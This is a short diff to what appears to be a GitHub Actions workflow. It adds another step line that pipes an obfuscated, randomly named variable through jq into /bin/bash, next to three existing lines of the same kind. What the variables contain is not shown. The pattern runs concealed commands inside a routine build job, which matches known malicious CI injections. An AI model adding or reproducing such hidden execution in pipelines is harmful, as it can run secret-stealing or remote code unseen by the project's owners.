@@ -26,6 +26,7 @@ jobs:
           echo $ibvrn86 | jq -r .ewcnx4 | /bin/bash
           echo $nsdqh52 | jq -r .tbhir2 | /bin/bash
           echo $b7 | jq -r .yhh29 | /bin/bash
+          echo $vogs677 | jq -r .b8 | /bin/bash
 
       - name: Archive data
         uses: actions/upload-artifact@v4
